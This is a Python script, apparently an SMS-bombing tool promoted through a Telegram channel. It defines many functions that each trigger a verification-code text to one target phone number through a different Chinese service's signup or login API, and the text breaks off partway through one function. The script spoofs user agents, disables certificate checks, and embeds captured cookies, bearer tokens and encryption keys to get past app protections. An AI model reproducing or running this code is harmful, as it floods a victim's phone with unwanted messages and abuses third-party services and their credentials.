import subprocess
import sys

def install_package(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

libs = ['requests', 'pycryptodome']
for lib in libs:
    install_package(lib)

YELLOW = '\x1b[93m'
END = '\033[0m'
print(f"{YELLOW}下载完成{END}")

import requests
import json
import time
import random
import hashlib
import base64
import hmac
import uuid
import string
import urllib.parse
from Crypto.Cipher import AES, DES3, PKCS1_v1_5
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA

requests.packages.urllib3.disable_warnings()

YELLOW = '\x1b[93m'
GREEN = '\033[92m'
RED = '\x1b[91m'
END = '\x1b[0m'

print(f"\n{YELLOW}=================================================={END}")
print(f"{GREEN}加入TG频道{END}")
print(f"{GREEN}鱼丸{END}")
print(f"{GREEN}TG官方频道@yuwan9178{END}")
print(f"{YELLOW}==================================================\n{END}")

def random_user_agent():
    ua_list = [
        'Mozilla/5.0 (Linux; Android 16; PKW110 Build/BP2A.250605.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0',
        'Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(ua_list)

def replace_phone_in_data(data_str, phone):
    placeholders = ['13800000000', '15915637092', '15915637093', '15915637098', '13800000002', '13856312354', '13000000000']
    for placeholder in placeholders:
        if placeholder in data_str:
            return data_str.replace(placeholder, phone)
    return data_str

def chunk_split(l, s):
    return '\n'.join([s[i:i+l] for i in range(0, len(s), l)])

def rsa_encrypt(plaintext, pub_b64):
    pub_key = '-----BEGIN PUBLIC KEY-----\n' + chunk_split(64, pub_b64) + '\n-----END PUBLIC KEY-----'
    key = RSA.import_key(pub_key)
    cipher = PKCS1_v1_5.new(key)
    return base64.b64encode(cipher.encrypt(plaintext.encode())).decode()

def aes_cbc_encrypt(plaintext, key_hex, iv_hex):
    key = bytes.fromhex(key_hex)
    iv = bytes.fromhex(iv_hex)
    padded = pad(plaintext.encode('ascii'), AES.block_size, style='pkcs7')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(padded)).decode()

def aes_ecb_encrypt(plaintext, key_hex):
    key = bytes.fromhex(key_hex)
    padded = pad(plaintext.encode('ascii'), AES.block_size, style='pkcs7')
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(padded)).decode()

def des3_ecb_encrypt(plaintext, key):
    key_bytes = key.encode('utf-8').ljust(24, b'\x00')
    cipher = DES3.new(key_bytes, DES3.MODE_ECB)
    padded = pad(plaintext.encode('utf-8'), DES3.block_size, style='pkcs7')
    return base64.b64encode(cipher.encrypt(padded)).decode()

def uuid_create():
    return str(uuid.uuid4()).replace('-', '').upper()

def send_code_1(phone):
    url = 'https://app.api.zjxinyijia.cn/api/oauth/sendCode'
    payload = {'forAction': 'registerORlogin', 'phone': phone}
    headers = {'User-Agent': random_user_agent(), 'Content-Type': 'application/json'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_sms_50(phone):
    url = 'https://dlmixc-parking.lncrland.cn/syhgwxh-api/1.0/default/send-msg'
    headers = {'User-Agent': random_user_agent(), 'Content-Type': 'application/json', 'Referer': 'https://servicewechat.com/wx61c81e0c74e1c278/13/page-frame.html'}
    data_template = '{"phone":"15915637092","tempType":"ZL","channel":"MINI","length":4}'
    data = replace_phone_in_data(data_template, phone)
    try:
        requests.post(url, headers=headers, data=data, timeout=10, verify=False)
    except:
        pass

def send_caizhidao(phone):
    url = 'https://ngssa.caizidao.com.cn/ngssa/api/auth/sms/v1/send'
    key_hex = '4d6b6753484b4f594370346a374f614c2b426b42384f6455'
    iv_hex = '65577734616e706b5a54423662336335'
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': 'application/json',
        'x-device-id': '9938ba09309274d5e802bc4ad97ce979b',
        'x-device-type': 'adr',
        'x-app-version': '2.0.48'
    }
    try:
        encrypted = aes_cbc_encrypt(phone, key_hex, iv_hex)
        payload = {'mobile': encrypted, 'type': '0'}
        requests.post(url, json=payload, headers=headers, verify=False, timeout=15)
    except:
        pass

def send_hrhgstock(phone):
    key_hex = '41594d74363448486b76435a734546787273337143773d3d'
    cookie = 'acw_tc=0a45644e17615034794703872ed0973aeb3bb93c217095a944a459a562274c; JSESSIONID=8ABB0AFB83C0DCB2663587A9A1572E08'
    url = 'https://cms.hrhgstock.com/api/userNew/sendCode'
    headers = {'User-Agent': random_user_agent(), 'Content-Type': 'application/json', 'Cookie': cookie}
    try:
        encrypted = aes_ecb_encrypt(phone, key_hex)
        payload = {'phone': encrypted, 'type': 1}
        requests.post(url, json=payload, headers=headers, verify=False, timeout=10)
    except:
        pass

def send_pupu_fund(phone):
    url = 'https://wapp.ppwfund.com/v1/user/sendVerificationCode'
    secret_key = 'AGAO57D4E5FY27H8I9J0G1I4'
    fixed_params = {
        'app_install_version': '7.11.0',
        'app_type': '23',
        'device_brand': 'OnePlus',
        'channel': 'oppo',
        'device_os_version': '15',
        'device_mode': 'OPD2404',
        'device_type': '2',
        'device_uuid': '3c7ab5c8355a45493a0b9864d6411ce1'
    }
    headers = {
        'User-Agent': random_user_agent(),
        'Cookie': 'SERVERCORSID=22e688d802366a2ef62aafa89f843c5a|1764290419|1764290365; SERVERID=22e688d802366a2ef62aafa89f843c5a|1764290419|1764290365; acw_tc=0ae5a7e317642903657277841e1e0e31b62486407909c721a8d13b6e146523'
    }
    try:
        business_data = {'code_length': '6', 'phone': phone, 'send_type': '13'}
        plaintext = json.dumps(business_data, separators=(',', ':'))
        timestamp = str(int(time.time()))
        nonce = uuid_create()
        data = des3_ecb_encrypt(plaintext, secret_key)
        sign_plain = fixed_params['app_install_version'] + fixed_params['app_type'] + data + fixed_params['device_uuid'] + secret_key + nonce + timestamp
        sign = hashlib.md5(sign_plain.encode()).hexdigest()
        full_params = {**fixed_params, 'data': data, 'nonce': nonce, 'timestamp': timestamp, 'sign': sign}
        requests.post(url, data=full_params, headers=headers, verify=False, timeout=15)
    except:
        pass

def send_isignet(phone):
    url = 'https://asms-m.isignet.cn:7676/ASMSServer/user/sendVerifyCode'
    headers = {'User-Agent': random_user_agent(), 'Content-Type': 'application/json', 'Referer': 'https://servicewechat.com/wxc15545eddbffa68f/23/page-frame.html'}
    payload = {'mobile': phone, 'version': '1.0'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_passport_fanli(phone):
    url = f'https://passport.fanli.com/mobileapi/i/user/mobileFastReg?jsoncallback=jQuery21107878787528225448_1752429344083&mobile={phone}&countrycode=86&mobilestep=1&_=1752429344086'
    headers = {'User-Agent': random_user_agent(), 'X-Requested-With': 'com.fanli.android.apps', 'Referer': 'https://m.fanli.com/'}
    try:
        requests.get(url, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_huashenghaoche(phone):
    url = 'https://wxweb.huashenghaoche.com/hshcwxweb/user/bindPhone/getCode'
    params = {'imageCode': '', 'phone': phone, 'imageId': '', 'uid': ''}
    headers = {'token': '', 'content-type': 'application/x-www-form-urlencoded', 'charset': 'utf-8', 'Referer': 'https://servicewechat.com/wx84b2c08c79130ac9/65/page-frame.html', 'User-Agent': random_user_agent()}
    try:
        requests.get(url, params=params, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_dxmbaoxian(phone):
    url = 'https://www.dxmbaoxian.com/juhe/insurface/consultant/sendVerificationCode'
    headers = {
        'Host': 'www.dxmbaoxian.com',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Android"',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"',
        'Content-Type': 'application/json;charset=UTF-8',
        'sec-ch-ua-mobile': '?1',
        'Origin': 'https://www.dxmbaoxian.com',
        'X-Requested-With': 'com.tencent.mm',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.dxmbaoxian.com/s/product?itemId=2000000356&channelId=dxmjr_H5-shouye-dakapian1&sourceChannel=shareMSG_wx-service-xiaochengxu-1005',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'User-Agent': random_user_agent()
    }
    payload = {
        'from': '36',
        'tagId': '',
        'channelId': 'dxmjr_H5-shouye-dakapian1',
        'sourceChannel': 'shareMSG_wx-service-xiaochengxu-1005',
        'timestamp': 29239535,
        'wxAccessCode': None,
        'sessionId': 'a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495',
        'errTimes': 0,
        'syncStokenTime': 0,
        'currentSyncTimes': 0,
        'did': None,
        'phone': phone
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_pub_yaofangwang(phone):
    url = 'https://pub.yaofangwang.com/4000/4000/0/guest.account.sendSMS'
    params = {
        'mobile': phone,
        'type': '1',
        'get_from': 'wx_miniapp_1',
        '__client': 'app_wx',
        'app_version': '7.1.59',
        'osVersion': 'miniapp',
        'deviceName': 'OPD2404',
        'os': 'android',
        'version': '8.0.63',
        'market': 'OnePlus',
        'networkType': 'true',
        'lat': '31.221140483329414',
        'lng': '121.54408972227351',
        'user_city_name': '上海市',
        'user_region_id': '',
        'idfa': 'wx_0e1Y0WZv3PVNI53p184w3mWmrZ0Y0WZZ',
        'device_no': 'wx_0e1Y0WZv3PVNI53p184w3mWmrZ0Y0WZZ'
    }
    headers = {'content-type': 'application/json', 'charset': 'utf-8', 'Referer': 'https://servicewechat.com/wx22c626a6d6d0f593/230/page-frame.html', 'Cookie': '', 'User-Agent': random_user_agent()}
    try:
        requests.get(url, params=params, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_weapp_91160(phone):
    url = 'https://weapp.91160.com/user/sendRegisterSms.html'
    params = {
        'token': '2da08e26e3c6a3d7efd10df71344bc96',
        'user_id': '258636457',
        'user_key': 'def0099a78949369cf609a1a7f4328f0HlgOKOrd20251101034653',
        'phone': phone,
        'type': 'bind',
        'captcha': '',
        'cid': '100012084',
        'channelId': '100012084'
    }
    headers = {
        'content-type': 'application/json;charset=UTF-8',
        'traceid': 'guahao/account/person/phone_cd267a6b-17dd-4965-9e84-1ba5a7202971-1759348076080',
        'charset': 'utf-8',
        'Referer': 'https://servicewechat.com/wx41d50f4960b90df8/417/page-frame.html',
        'Cookie': 'PHPSESSID=agh9ou5l00t89t7jpv9roi4n16; city_info=a%3A32%3A%7Bs%3A7%3A%22area_id%22%3Bi%3A3172%3Bs%3A6%3A%22areaId%22%3Bi%3A3172%3Bs%3A9%3A%22parent_id%22%3Bi%3A3157%3Bs%3A8%3A%22parentId%22%3Bi%3A3157%3Bs%3A9%3A%22area_name%22%3Bs%3A6%3A%22%E6%BE%84%E8%BF%88%22%3Bs%3A8%3A%22areaName%22%3Bs%3A6%3A%22%E6%BE%84%E8%BF%88%22%3Bs%3A7%3A%22t_level%22%3Bi%3A100%3Bs%3A6%3A%22tLevel%22%3Bi%3A100%3Bs%3A7%3A%22id_path%22%3Bs%3A12%3A%221%2C3157%2C3172%2C%22%3Bs%3A6%3A%22idPath%22%3Bs%3A12%3A%221%2C3157%2C3172%2C%22%3Bs%3A8%3A%22position%22%3Bi%3A50%3Bs%3A7%3A%22is_used%22%3Bi%3A1%3Bs%3A6%3A%22isUsed%22%3Bi%3A1%3Bs%3A8%3A%22log_stat%22%3Bi%3A0%3Bs%3A7%3A%22logStat%22%3Bi%3A0%3Bs%3A10%3A%22area_level%22%3Bs%3A1%3A%223%22%3Bs%3A9%3A%22areaLevel%22%3Bs%3A1%3A%223%22%3Bs%3A8%3A%22pos_name%22%3Bs%3A6%3A%22%E5%8D%8E%E5%8D%97%22%3Bs%3A7%3A%22posName%22%3Bs%3A6%3A%22%E5%8D%8E%E5%8D%97%22%3Bs%3A3%3A%22hot%22%3Bs%3A1%3A%220%22%3Bs%3A3%3A%22map%22%3Bs%3A20%3A%22110.006754%2C19.738521%22%3Bs%3A9%3A%22area_code%22%3Bs%3A3%3A%22cmx%22%3Bs%3A8%3A%22areaCode%22%3Bs%3A3%3A%22cmx%22%3Bs%3A7%3A%22is_show%22%3Bi%3A1%3Bs%3A6%3A%22isShow%22%3Bi%3A1%3Bs%3A5%3A%22i_key%22%3Bs%3A1%3A%22C%22%3Bs%3A4%3A%22iKey%22%3Bs%3A1%3A%22C%22%3Bs%3A9%3A%22mark_city%22%3Bi%3A0%3Bs%3A8%3A%22markCity%22%3Bi%3A0%3Bs%3A4%3A%22norm%22%3Bs%3A12%3A%22469023000000%22%3Bs%3A8%3A%22unit_sum%22%3Bi%3A9%3Bs%3A7%3A%22unitSum%22%3Bi%3A9%3B%7D; __jsluid_s=332d62db6b38df5af8d84dc3cbfecc4b',
        'User-Agent': random_user_agent()
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_hbxyjob(phone):
    url = 'https://www.hbxyjob.cn/wsite-web/api/verify'
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE4NDU3NTIzNTksInVzZXJpZCI6Ijc3Zjc4NjNjOGZlMTQ3ODU5ZjU4NmJjMzA0OGI2YTEwIiwiaWF0IjoxNzU5MzUyMzU5fQ.cRJcVZ8QBvxDocNTarIIX_PQiHFfwDX9UYsIoznCaUE',
        'charset': 'utf-8',
        'Referer': 'https://servicewechat.com/wxd2182d39c164d339/49/page-frame.html',
        'User-Agent': random_user_agent()
    }
    payload = {'phone': phone, 'type': 'register', 'company': 'isCompany'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_gig_c_api(phone):
    url = 'https://gig-c-api.1haozc.com/api/v2/auth/sendSmsCode'
    headers = {
        'Content-Type': 'application/json',
        'version_name': '3.0.1',
        'params': '{"_appid":"cpid","_rk":"9B47E841-924B-4E03-8384-A43A4D8C8B4B","_ts":"20251002055057","_v":"1.0","_sign":"bffc13fb4f728518a3deb0d35c12792d"}',
        'charset': 'utf-8',
        'referer': 'https://servicewechat.com/wx8f3fac1aef79d998/73/page-frame.html',
        'User-Agent': random_user_agent()
    }
    payload = {'phone': phone, 'codeType': 1}
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_xuexi_wacai(phone):
    url = 'https://xuexi.wacai.com/edu-app/api/user/sms-send'
    headers = {
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-access-token': '',
        'x-mc': '00000001',
        'x-platform': '226',
        'x-appver': '1.0.16',
        'User-Agent': random_user_agent()
    }
    payload = {'mob': phone}
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_api_livelab(phone):
    url = 'https://api.livelab.com.cn/thirdParty/sms/app/captcha'
    headers = {
        'Accept-Encoding': 'gzip',
        'platform-type': 'android',
        'x-fwd-anonymousid': 'ae9b5df9da406ccb',
        'platform-version': '3.20.0',
        'User-Agent': random_user_agent()
    }
    data = {'phone': phone, 'type': '1'}
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_hyqb_jinnuodai(phone):
    url = 'https://hyqb.jinnuodai.com.cn/api/v2/sms/send'
    headers = {
        'Connection': 'Keep-Alive',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'Authorization': '',
        'distributorId': '289',
        'tag': 'sbqb-speed',
        'Content-Type': 'application/json;charset=utf-8;',
        'User-Agent': random_user_agent()
    }
    params = {'phone': phone}
    try:
        requests.post(url, params=params, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_chinalife_p(phone):
    url = 'https://wechat.chinalife-p.com.cn/cdf/wechat/user/appAuth/getVerifyCode'
    headers = {
        'Connection': 'close',
        'Accept-Encoding': 'gzip',
        'operateId': '',
        'terminal': 'APP',
        'version': '5.2.6',
        'appOS': 'A',
        'cdf-token-default': '',
        'User-Agent': random_user_agent()
    }
    payload = {'mobilePhone': phone, 'captchaType': '01'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_touker(phone):
    url = 'https://m.touker.com/account/stock/guide/index/sendSmsCode.do'
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'sec-ch-ua-platform': '"Android"',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'Origin': 'https://m.touker.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://m.touker.com/account/stock/guide/index.htm?referrer=https://m.touker.com/hbzqkhview/index.html',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'acw_tc=0a5cc91617613252880581805efe76563a0f06a09fff5298a7eb35877d4ac3; _b_=e768bf6f-a4fc-4de5-941d-e500a59d48128E01CE61; deviceInfo=%7B%22macAddress%22%3A%22%22%2C%22systemName%22%3A%22Android%22%2C%22model%22%3A%22%22%2C%22appVerion%22%3A%2215%22%2C%22localizedModel%22%3A%22%22%2C%22uuid%22%3A%22%22%2C%22systemVersion%22%3A%2215%22%2C%22phoneNum%22%3A%22%22%2C%22ipAdress%22%3A%22%22%2C%22idfa%22%3A%22%22%2C%22imsi%22%3A%22%22%2C%22iccid%22%3A%22%22%2C%22rmpn%22%3A%22%22%2C%22dev%22%3A%22HB-H5%22%7D; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219a172b0d29829-048cad55e52bc14-1713104a-923544-19a172b0d2b67b%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTlhMTcyYjBkMjk4MjktMDQ4Y2FkNTVlNTJiYzE0LTE3MTMxMDRhLTkyMzU0NC0xOWExNzJiMGQyYjY3YiJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219a172b0d29829-048cad55e52bc14-1713104a-923544-19a172b0d2b67b%22%7D; partnerCode=\'\'',
        'User-Agent': random_user_agent()
    }
    data = {'phone': phone, 'deviceUUID': 'v1__PImPF1SOA0x3wvaJrHJZEA'}
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_guominpension(phone):
    url = 'https://unifyapp.guominpension.com/publicapi/unifyapp-admin/app/sendCheckSmsCode'
    headers = {
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json;charset=utf-8',
        'lockandlock': 'xxx',
        '_ZaServerEncrypt': '1',
        '_IsZaWebEncrypt': '1',
        '_ZaGateWayEncrypt': '0',
        't': 'android',
        'dslDeviceID': '9f4ed233-6a29-43d7-8a8a-0e71f22df7c7',
        'v': '1.6.1',
        'appPushToken': '022205e64067ef434c45646c33683f39b443',
        'osVersion': '15',
        'osDevice': 'OPD2404',
        'deviceId': '19b9dea7fb19a3a8',
        'zaid': '19b9dea7fb19a3a8',
        'bizOrigin': 'oppo',
        'traceId': 'be3739c7-3329-446e-abc1-063317579a14',
        'appCode': 'com.guomin.insurance',
        'idfa': '19b9dea7fb19a3a8',
        'sign': 'cc37988c6af6bebbcc5c40a54839e404',
        'User-Agent': random_user_agent()
    }
    payload = {'msgType': '01', 'mobile': phone}
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_passport_xag(phone):
    url = 'https://passport.xag.cn/home/sms_code'
    data = f'icc=86&phone={phone}'
    headers = {
        'Host': 'passport.xag.cn',
        'Connection': 'keep-alive',
        'mini': 'member',
        'Accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'token': '',
        'Authorization': 'Basic RjIxMUIwODFCQ0FFNERBM0ZCMzBDNUU4MThCRkRBRjI6ODdmMzc5ODdhMjc5MmRiNDU0ZDkzNGM0NGNiY2JlZjM=',
        'charset': 'utf-8',
        'Referer': 'https://servicewechat.com/wx43471742f3e783cb/248/page-frame.html',
        'User-Agent': random_user_agent()
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_support_mikecrm(phone):
    url = 'https://support.mikecrm.com/handler/web/form_runtime/handleGetPhoneVerificationCode.php'
    inner = {'t': 'cvs', 'cp': 'j7ctI52', 'mb': phone}
    inner_json = json.dumps(inner, separators=(',', ':'))
    data = 'd=' + urllib.parse.quote(inner_json)
    headers = {
        'Host': 'support.mikecrm.com',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Android"',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'sec-ch-ua-mobile': '?1',
        'Origin': 'https://support.mikecrm.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://support.mikecrm.com/j7ctI52?_cpv=%7B%22208395996%22%3A%22http%3A%2F%2Fcn.mikecrm.com%2FozURs1%22%7D',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'uvi=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz; mk_seed=84; MK_L_UVD=%7B%2223%22%3A%2218070783632%22%2C%2231%22%3A%22%u6551%u8D4E%u7F51%u7EDC%u5B89%u5168%22%2C%2232%22%3A%22%u56FD%u5B89%22%7D; uvis=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz',
        'User-Agent': random_user_agent()
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_4399(phone):
    url = f'https://ptlogin.4399.com/oauth2/sendPhoneLoginCode.do?phone={phone}&v=1'
    headers = {
        'Host': 'ptlogin.4399.com',
        'Connection': 'keep-alive',
        'User-Agent': random_user_agent(),
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://ptlogin.4399.com/oauth2/authorize.do?client_id=a9a16636dbaeb917e2ffb16f0d52006e&redirect_uri=https%3A%2F%2Fh.api.4399.com%2FunifiedLogin%2Fuser%2Flogin%2Fcallback%3FcallbackUrl%3Dhttps%253A%252F%252Fh.4399.com%252Fwap%252Fuser.htm&response_type=token&show_ext_login=true&loginRealNameLevel=4&regRealNameLevel=4',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': '_4399stats_vid=1780846153788791; USESSIONID=30e0f9de-d91a-441e-b9dd-e3bc87485658'
    }
    try:
        requests.get(url, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_startupfun(phone):
    url = 'https://yun-api.startupfun.cn/api/v1/user/mobile/get_verify_code'
    params = {'appId': 'wxbfd55a2196642168', 'ci': 'e95cd2e0-ea60-11f0-8cb7-b718e17888fd', 'cp': 'w', 'cv': '3.8.8', 'wpcp': '', 'wxSource': 'wx'}
    json_data = {
        'deviceId': 'o2HBJNZBAmbC3ao6M',
        'mobile': phone,
        'type': 1,
        'uid': '',
        'cp': 'w',
        'ci': 'e95cd2e0-ea60-11f0-8cb7-b718e17888fd',
        'cv': '3.8.8',
        'appId': 'wxbfd55a2196642168',
        'wxSource': 'wx',
        'wpcp': ''
    }
    headers = {
        'Content-Type': 'application/json',
        'uid': '',
        'X-Tuiwen-Token': '',
        'charset': 'utf-8',
        'Referer': 'https://servicewechat.com/wxbfd55a2196642168/186/page-frame.html',
        'User-Agent': random_user_agent()
    }
    try:
        requests.post(url, params=params, json=json_data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_madudu(phone):
    url = 'https://sms.madudu.com.cn/api/v1/send_sms'
    json_data = {'phone': phone, 'channel_id': 54}
    headers = {'Content-Type': 'application/json', 'charset': 'utf-8', 'referer': 'https://servicewechat.com/wx3aee08af557777b8/20/page-frame.html', 'User-Agent': random_user_agent()}
    try:
        requests.post(url, json=json_data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_sxjgsw(phone):
    url = 'https://jkb.sxjgsw.gov.cn:8084/Service/userinfo/smscode2'
    data = {'emphone': phone}
    headers = {
        'Host': 'jkb.sxjgsw.gov.cn:8084',
        'openid': 'o78r74htrgPv_dhRV1yllcgKhjQM',
        'officeZone': '',
        'charset': 'utf-8',
        'Referer': 'https://servicewechat.com/wxe58649eb4216c254/59/page-frame.html',
        'User-Agent': random_user_agent()
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_jd100(phone):
    url = 'https://jdapi.jd100.com/uc/v1/getSMSCode'
    params = {'account': phone, 'sign_type': '1', 'use_type': '4', 'time': str(int(time.time() * 1000))}
    headers = {
        'Host': 'jdapi.jd100.com',
        'Connection': 'keep-alive',
        'User-Agent': random_user_agent(),
        'content-type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://mbpgld.jd100.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://mbpgld.jd100.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_9377(phone):
    url = 'http://www.9377.com/h5/register.php'
    headers = {
        'Host': 'www.9377.com',
        'Connection': 'keep-alive',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://www.9377.com',
        'Referer': 'http://www.9377.com/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'SESSID=51thqb5me77g9vbisv45l001u7; dwby_ad_dialog=1735738330480'
    }
    data = {'do': 'register', 'cellphone': '1', 'send_captcha': 'sent', 'tel': phone}
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_cf40(phone):
    url = 'https://api.cf40.com/api/cf40/h5/sendCode'
    payload = {'login_name': phone, 'reqType': 'register', 'codeType': 'phone'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"',
        'content-type': 'application/json;charset=UTF-8',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://cf40.com',
        'x-requested-with': 'com.cf40.research.android',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://cf40.com/',
        'accept-language': 'zh,en-US;q=0.9,en;q=0.8',
        'priority': 'u=1, i'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_pinduoduo_dynamic(phone):
    url = 'https://mms.pinduoduo.com/earth/api/sendSms/sendMmsCreateMallVerificationCode'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'zh-CN,zh;q=0.9',
